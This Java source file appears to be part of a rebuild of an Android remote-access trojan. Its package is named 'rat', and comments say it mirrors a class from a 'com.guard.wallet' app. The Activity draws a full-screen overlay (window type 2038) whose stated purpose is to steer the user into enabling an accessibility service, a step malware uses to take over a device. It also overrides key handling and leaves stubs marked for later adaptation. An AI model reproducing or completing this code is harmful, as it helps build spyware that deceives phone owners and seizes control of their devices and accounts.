package com.vendor.rat.activity;

import android.app.Activity;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.LinearLayout;

import java.lang.ref.WeakReference;

/**
 * Vendor: com.guard.wallet.activity.GuideActivity
 * Displays a guide/webview overlay to direct user to enable accessibility service.
 */
public class GuideActivity extends Activity {

    public WeakReference<View> guideViewRef;

    @Override
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        requestWindowFeature(1);
        getWindow().getDecorView().setBackgroundColor(Color.parseColor("#303133"));
        getWindow().setBackgroundDrawable(new ColorDrawable(Color.parseColor("#303133")));
        LinearLayout linearLayout = new LinearLayout(this);
        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams();
        layoutParams.width = -1;
        layoutParams.height = -1;
        setContentView(linearLayout, layoutParams);
        // ADAPT: vendor creates e0.e webview wrapper
        // TODO: VENDOR_VERIFY - guide webview implementation
        WindowManager.LayoutParams attributes = getWindow().getAttributes();
        attributes.type = 2038;
        getWindow().setAttributes(attributes);
    }

    @Override
    public final void onDestroy() {
        Log.d("GuideActivity", "GuideActivity onDestroy");
        if (guideViewRef != null && guideViewRef.get() != null) {
            guideViewRef = null;
        }
        super.onDestroy();
    }

    @Override
    public final boolean onKeyDown(int keyCode, KeyEvent event) {
        return false;
    }

    @Override
    public final void onPause() {
        super.onPause();
    }

    @Override
    public final void onResume() {
        super.onResume();
        Log.d("GuideActivity", "GuideActivity onResume");
    }

    @Override
    public final void onStart() {
        super.onStart();
    }
}
